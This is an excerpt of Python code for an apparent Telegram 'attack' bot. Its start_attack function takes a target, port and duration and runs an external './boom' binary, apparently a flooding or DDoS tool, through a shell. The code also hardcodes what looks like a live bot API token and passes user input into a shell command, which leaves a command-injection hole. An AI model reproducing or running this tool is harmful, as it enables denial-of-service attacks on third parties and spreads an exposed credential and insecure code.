...
bot = telebot.TeleBot('7802509187:AAH-ktOg62K-aznnabcokfIZV1h_woslGK4')
...
def start_attack(user_id, target, port, duration):
    ...
    try:
        ...
        ongoing_attacks[attack_id] = subprocess.Popen(f"./boom {target} {port} {duration} 10", shell=True)
